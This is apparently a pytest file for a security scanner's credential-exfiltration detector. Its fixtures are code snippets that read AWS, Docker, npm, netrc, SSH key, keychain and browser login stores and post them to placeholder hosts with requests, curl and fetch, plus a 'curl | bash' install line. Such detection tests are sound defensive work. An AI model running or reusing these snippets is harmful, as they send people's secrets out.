"""A credential store read and a network call are theft only when one reaches the other."""

from __future__ import annotations

from cordon_scanner.detect.store_flow import StoreFlow


class FlowKit:
    @staticmethod
    def lines_of(text: str, *needles: str) -> list[int]:
        return [
            i for i, line in enumerate(text.split("\n"), start=1) if any(n in line for n in needles)
        ]

    @staticmethod
    def flows(text: str, store: str, egress: str) -> bool:
        return StoreFlow.reaches(
            text, FlowKit.lines_of(text, store), FlowKit.lines_of(text, egress)
        )


class TestAFlow:
    def test_python_through_two_names(self):
        text = (
            "import os, requests\n"
            "p = os.path.expanduser('~/.aws/credentials')\n"
            "\n"
            "body = open(p).read()\n"
            "payload = {'k': body}\n"
            "\n"
            "requests.post('https://example.invalid', json=payload)\n"
        )
        assert FlowKit.flows(text, ".aws/credentials", "requests.post")

    def test_shell_command_substitution(self):
        text = (
            'creds=$(cat ~/.docker/config.json)\n\n\n\ncurl -d "$creds" https://example.invalid\n'
        )
        assert FlowKit.flows(text, ".docker/config.json", "curl")

    def test_a_function_that_returns_the_store(self):
        text = (
            "function load() {\n"
            "  return fs.readFileSync(home + '/.npmrc', 'utf8');\n"
            "}\n"
            "\n"
            "\n"
            "fetch(url, { method: 'POST', body: load() });\n"
        )
        assert FlowKit.flows(text, ".npmrc", "fetch(")

    def test_a_call_on_the_same_line(self):
        text = "x = 1\nrequests.post(u, files={'f': open(os.path.expanduser('~/.netrc'))})\n"
        assert FlowKit.flows(text, ".netrc", "requests.post")

    def test_through_a_copy(self):
        text = (
            "src = Path.home() / '.config' / 'Login Data'\n"
            "shutil.copy(src, staged)\n"
            "rows = sqlite3.connect(staged).execute(q)\n"
            "urllib.request.urlopen(u, str(list(rows)).encode())\n"
        )
        assert FlowKit.flows(text, "Login Data", "urlopen")

    def test_through_a_collection_and_a_file(self):
        text = (
            "found = []\n"
            "for row in sqlite3.connect(Path.home() / 'Login Data').execute(q):\n"
            "    found.append(row)\n"
            "with open('dump.txt', 'w') as out:\n"
            "    out.write(str(found))\n"
            "\n\n\n"
            "requests.post(hook, files={'f': open('dump.txt', 'rb')})\n"
        )
        assert FlowKit.flows(text, "Login Data", "requests.post")

    def test_arguments_on_the_lines_after_the_call(self):
        text = "data = open(KEYCHAIN).read()\n\n\nrequests.post(\n    url,\n    data=data,\n)\n"
        assert FlowKit.flows(text, "KEYCHAIN).read", "requests.post")


class TestNoFlow:
    def test_an_installer_far_from_a_config_read(self):
        text = (
            "host=$(grep Host ~/.ssh/config | head -1)\n"
            'echo "using $host"\n'
            "\n"
            "\n"
            "curl -fsSL https://example.invalid/install.sh | bash\n"
        )
        assert not FlowKit.flows(text, ".ssh/config", "curl")

    def test_nothing_named(self):
        text = "open('/root/.aws/credentials')\n\n\n\nurllib.request.urlopen(classifiers_url)\n"
        assert not FlowKit.flows(text, ".aws/credentials", "urlopen")


class TestTheGrade:
    """Where nothing read reaches the call, the finding is recorded below the gate -- unless
    the file names a channel nobody sends their own keys to, or runs on its own."""

    STORE_THEN_INSTALLER = (
        "import os, subprocess\n"
        "HOSTS = os.path.expanduser('~/.aws/credentials')\n"
        "print(open(HOSTS).read().count(chr(10)))\n" + "\n" * 20 + "import urllib.request\n"
        "urllib.request.urlretrieve('https://example.invalid/tool.tar.gz', 'tool.tar.gz')\n"
    )

    @staticmethod
    def grade(tmp_path, text: str, name: str = "app/sync.py"):
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        target = tmp_path / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text, encoding="utf-8")
        found = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path).findings
        return [f.severity for f in found if f.rule_id == "SUSPECT.EXFIL.CREDENTIAL_STORE.001"]

    def test_no_flow_is_recorded_below_the_gate(self, tmp_path):
        from cordon_scanner.core.models import Severity

        grades = self.grade(tmp_path, self.STORE_THEN_INSTALLER)
        assert grades
        assert all(g <= Severity.MEDIUM for g in grades)

    def test_a_chat_bot_beside_the_store_keeps_it(self, tmp_path):
        from cordon_scanner.core.models import Severity

        grades = self.grade(tmp_path, "import discord\n" + self.STORE_THEN_INSTALLER)
        assert any(g >= Severity.HIGH for g in grades)


class TestAnImportedClient:
    def test_the_call_of_an_imported_client_is_where_the_request_is(self):
        text = (
            'import fetch from "node-fetch";\n'
            "\n" * 6 + 'const keyDir = path.join(os.homedir(), ".ssh");\n'
            "const body = fs.readFileSync(path.join(keyDir, 'id_rsa'));\n"
            "\n" * 4 + "await fetch(url, { method: 'POST', body });\n"
        )
        assert FlowKit.flows(text, ".ssh", "node-fetch")
